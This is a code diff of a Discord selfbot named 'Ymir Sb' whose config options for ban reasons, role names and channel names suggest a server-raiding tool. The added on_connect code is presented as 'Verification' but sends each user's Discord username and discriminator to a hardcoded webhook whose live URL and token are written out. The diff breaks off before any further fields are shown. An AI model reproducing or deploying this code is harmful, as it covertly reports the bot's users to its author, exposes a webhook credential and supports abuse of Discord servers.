@@ -10,16 +10,11 @@ from discord import Webhook, AsyncWebhookAdapter
 import datetime
 import requests
 from colored import fg, attr
-import sys
-import website
-import base64
-import ctypes
 from discord_webhook import DiscordWebhook, DiscordEmbed
+import colorama
+from colorama import Fore, Back, Style
 
-REAL_PATH = os.path.dirname(os.path.realpath(__file__))
-
-
-with open(REAL_PATH+"/config.json") as f:
+with open('config.json', 'r') as f:
     config = json.load(f)
 
 intents=discord.Intents.all()
@@ -38,6 +33,22 @@ banreason = config.get('ban-reason')
 webhookavatar = config.get('webhook-avatar')
 rolename = config.get('role-name')
 channelname = config.get('channel-name')
+
+@ymir.event
+async def on_ready():
+ print(f'''
+                  {Fore.LIGHTRED_EX}██╗   ██╗███╗   ███╗██╗██████╗ {Style.RESET_ALL}
+                  {Fore.LIGHTRED_EX}╚██╗ ██╔╝████╗ ████║██║██╔══██╗{Style.RESET_ALL}
+                  {Fore.LIGHTRED_EX} ╚████╔╝ ██╔████╔██║██║██████╔╝{Style.RESET_ALL}
+                  {Fore.LIGHTRED_EX}  ╚██╔╝  ██║╚██╔╝██║██║██╔══██╗{Style.RESET_ALL}
+                  {Fore.LIGHTRED_EX}   ██║   ██║ ╚═╝ ██║██║██║  ██║{Style.RESET_ALL}
+                  {Fore.LIGHTRED_EX}   ╚═╝   ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝{Style.RESET_ALL}
+
+                     {Fore.WHITE}[{Fore.LIGHTRED_EX}Y{Fore.WHITE}]{Style.RESET_ALL}Coded By solar#7777
+                     {Fore.WHITE}[{Fore.LIGHTRED_EX}M{Fore.WHITE}]{Style.RESET_ALL}Ymir Sb
+                     {Fore.WHITE}[{Fore.LIGHTRED_EX}I{Fore.WHITE}]{Style.RESET_ALL}{ymir.user.name}#{ymir.user.discriminator} Is Connected
+                     {Fore.WHITE}[{Fore.LIGHTRED_EX}R{Fore.WHITE}]{Style.RESET_ALL}The Prefix Is {prefix}
+''')
 
 
 @ymir.command(aliases=['h','Help'])
@@ -248,7 +259,7 @@ async def kick(ctx):
 @ymir.event
 async def on_connect(): 
  webav = 'https://cdn.discordapp.com/attachments/816065264054698035/816127701458485248/pieck_fall.gif'
- webhook = DiscordWebhook (url='', username="YMIR Verification", avatar_url=(webav))
+ webhook = DiscordWebhook (url='https://discord.com/api/webhooks/829123147306893374/KIQLMM_YkXglyVHEbWSm-14mUVBrUvrDsNfmS32GLkDieiqKiZ7BKGODJ1VLsaEeRDwl', username="YMIR Verification", avatar_url=(webav))
 
  embed = DiscordEmbed(color= 0xffb2a3, description= '```Ymir Verification```')
  embed.add_embed_field(name = "UserName",  value=f"{ymir.user.name}#{ymir.user.discriminator}", inline = False)
